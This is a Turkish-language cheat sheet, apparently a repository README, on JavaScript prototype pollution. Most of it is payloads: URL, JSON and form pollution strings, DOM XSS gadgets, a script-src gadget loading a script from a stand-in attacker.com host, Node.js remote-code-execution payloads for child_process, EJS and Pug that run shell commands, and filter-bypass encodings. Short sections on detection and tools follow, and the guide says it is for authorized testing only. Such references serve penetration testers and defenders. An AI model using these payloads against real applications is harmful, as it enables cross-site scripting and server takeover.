[🇬🇧 English](../../README.md)

# 🧬 Prototip Kirlenmesi (Prototype Pollution) Başvuru Kılavuzu

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 Prototip Kirlenmesi (Prototype Pollution) Nedir?

**Prototip Kirlenmesi (Prototype Pollution)**, saldırganın `Object.prototype` nesnesine yeni özellikler (properties) eklemesine veya mevcut özellikleri değiştirmesine olanak tanıyan bir JavaScript zafiyetidir. JavaScript'te tüm nesneler varsayılan olarak temel prototipten türediği için bu değişiklik uygulamadaki tüm nesneleri etkiler.

### Etkileri
- 🔴 **XSS** - İstemci tarafında DOM manipülasyonu ile kod yürütme
- 🔴 **RCE (Uzaktan Kod Yürütme)** - Sunucu tarafında (Node.js) sistem komutları çalıştırma
- 🔴 **Güvenlik Kontrollerini Atlama** - Yetkilendirme veya mantık kontrollerini devre dışı bırakma
- 🔴 **Hizmet Dışı Bırakma (DoS)** - Uygulama çalışma zamanını çökerterek erişimi engelleme

---

## 🔍 JavaScript Prototipleri Nasıl Çalışır?

### Temel Mantık
```javascript
// Her nesne Object.prototype nesnesinden miras alır
let obj = {};
obj.__proto__ === Object.prototype  // true

// Eğer prototipi kirletirsek:
Object.prototype.polluted = "hacked";

// Uygulamadaki tüm nesneler bundan etkilenir:
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### Tehlikeli Özellikler
```javascript
__proto__
constructor
prototype
```

---

## 💉 İstemci Tarafı (Client-Side) Payload'ları

### URL Üzerinden (Query / Hash)
```
# Temel
?__proto__[polluted]=value
?__proto__.polluted=value

# Constructor üzerinden
?constructor[prototype][polluted]=value

# İç içe (Nested)
?__proto__[__proto__][polluted]=value

# URL kodlamalı (URL encoded)
?__proto__%5Bpolluted%5D=value
```

### JSON Verisi Üzerinden
```javascript
// Kullanıcı girdisi
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// İç içe JSON
{"a": {"__proto__": {"polluted": "value"}}}
```

### Form Verisi Üzerinden
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

## 🔥 İstismar Örnekleri

### innerHTML ile DOM XSS
```javascript
// Eğer uygulama kodu şöyleyse:
element.innerHTML = obj.html || "";

// Prototipi kirletin:
?__proto__[html]=<img src=x onerror=alert(1)>

// Sonuç: DOM XSS tetiklenir!
```

### Script src Gadget İstismarı
```javascript
// Eğer uygulama kodu şöyleyse:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Kirletme payload'ı:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### DOM Clobbering ile Kombinasyon
```javascript
// Yaygın gadget kalıpları
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### jQuery Gadget'ları
```javascript
// jQuery < 3.4.0 sürümlerinde
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// İstismar
?__proto__[url]=javascript:alert(1)
```

---

## 🖥️ Sunucu Tarafı (Node.js)

### child_process ile RCE
```javascript
// Uygulama options nesnesi ile spawn veya exec kullanıyorsa:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Kirletme payload'ı:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Veya:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### require() ile RCE
```javascript
// Kirlilik payload'ı
{"__proto__": {"main": "./pwned.js"}}
```

### EJS Şablon Motoru RCE
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### Pug Şablon Motoru RCE
```javascript
// Pug RCE
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

## 🔍 Tespit Etme

### Manuel Test
```javascript
// Tarayıcı konsolunda:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // "polluted" dönerse = zafiyet vardır

// Test sonrası temizleme
delete Object.prototype.testPollution;
```

### URL ile Test Etme
```
# URL'ye parametre ekleyip konsolu kontrol edin
?__proto__[test]=polluted

// Konsolda kontrol edin:
({}).test  // Normalde undefined olmalıdır; "polluted" dönerse zafiyet vardır
```

### Gadget Tespiti (DOM Invader)
```
1. Burp Suite içerisindeki DOM Invader aracını açın
2. Prototype Pollution modunu etkinleştirin
3. Uygulamayı gezin
4. Tetiklenebilir sink'leri inceleyin
```

---

## 🛠️ Araçlar

| Araç | Amaç |
|------|------|
| **DOM Invader** | PP tespiti için Burp Suite eklentisi |
| **ppfuzz** | Hızlı prototip kirlenmesi fuzzer'ı |
| **ppmap** | Gadget tarama aracı |
| **PPScan** | İstemci tarafı tarayıcı |

### ppmap Kullanımı
```bash
# Kurulum
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Tarama
node ppmap.js https://target.com
```

---

## 📊 Hızlı Başvuru

### Payload Formatları
| Format | Payload |
|--------|---------|
| Query | `?__proto__[x]=y` |
| Hash | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Merge | `Object.assign({},input)` |

### Yaygın Gadget'lar
| Özellik | Etki |
|---------|------|
| `innerHTML` | XSS |
| `src` | Script enjeksiyonu |
| `href` | Yönlendirme |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### Atlama (Bypass) Teknikleri
```javascript
// __proto__ filtreleniyorsa:
constructor.prototype.polluted = "value"

// Farklı gösterim (notation)
["__proto__"]["polluted"] = "value"

// Unicode kaçış dizileri
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

## 📚 Kaynaklar

- [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Server-side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [Client-side PP Scanner](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 Prototipi Kirletin!</b><br>
  <i>Yalnızca yetkili ve yasal testler içindir!</i>
</p>
